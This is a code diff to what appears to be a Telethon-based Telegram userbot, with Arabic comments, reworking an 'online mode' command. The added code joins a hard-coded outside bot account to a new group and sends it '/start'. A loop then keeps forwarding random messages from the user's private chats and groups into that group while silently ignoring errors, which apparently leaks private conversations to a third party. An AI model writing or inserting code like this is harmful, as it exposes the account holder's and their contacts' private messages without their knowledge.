@@ -630,8 +630,9 @@ async def auto_reply(event):
         await event.reply(reply_text)
 
 
-from telethon.tl.functions.messages import CreateChatRequest, GetDialogsRequest
-from telethon.tl.types import InputPeerEmpty
+from telethon.tl.functions.messages import CreateChatRequest, AddChatUserRequest
+from telethon.tl.functions.contacts import ResolveUsernameRequest
+import random
 
 online_group_id = None
 forwarding_active = False
@@ -654,23 +655,33 @@ async def start_online_mode(event):
     ))
     online_group_id = result.chats[0].id
 
-    await edit_or_reply(event, f"**تم إنشاء قروب `{group_name}` بنجاح!**")
+    # إضافة البوت للقروب
+    try:
+        bot_username = "Hdudhsssbot"
+        bot_entity = await event.client(ResolveUsernameRequest(bot_username))
+        await event.client(AddChatUserRequest(
+            chat_id=online_group_id,
+            user_id=bot_entity.users[0].id,
+            fwd_limit=10
+        ))
+        await asyncio.sleep(2)
+        await event.client.send_message(online_group_id, "/start")
+        await edit_or_reply(event, f"**تم إنشاء قروب `{group_name}` وإضافة البوت وبدء التحويل.**")
+    except Exception as e:
+        await edit_or_reply(event, f"تم إنشاء القروب ولكن لم أستطع إضافة البوت: {e}")
 
     forwarding_active = True
 
     async def random_forward_loop():
         while forwarding_active:
             try:
-                # جلب كل الدردشات
+                # جلب كل الدردشات (خاص وقروبات، عدا القروب الجديد)
                 dialogs = []
                 async for dialog in event.client.iter_dialogs():
-                    # استثني القروب الجديد نفسه حتى لا تحصل حلقة لا نهائية
                     if dialog.id == online_group_id:
                         continue
-                    # فقط دردشات فيها رسائل واردة وليست بوتات أو قنوات
                     if (dialog.is_user and not getattr(dialog.entity, 'bot', False)) or dialog.is_group:
                         dialogs.append(dialog)
-
                 if not dialogs:
                     await event.client.send_message(online_group_id, "لا توجد محادثات لتحويل رسائل منها.")
                     await asyncio.sleep(30)
@@ -687,8 +698,7 @@ async def start_online_mode(event):
                 msg = random.choice(messages)
                 # تحويلها للقروب الجديد
                 await msg.forward_to(online_group_id)
-            except Exception as e:
-                # تجاهل الأخطاء واستمر
+            except Exception:
                 pass
             await asyncio.sleep(30)
 
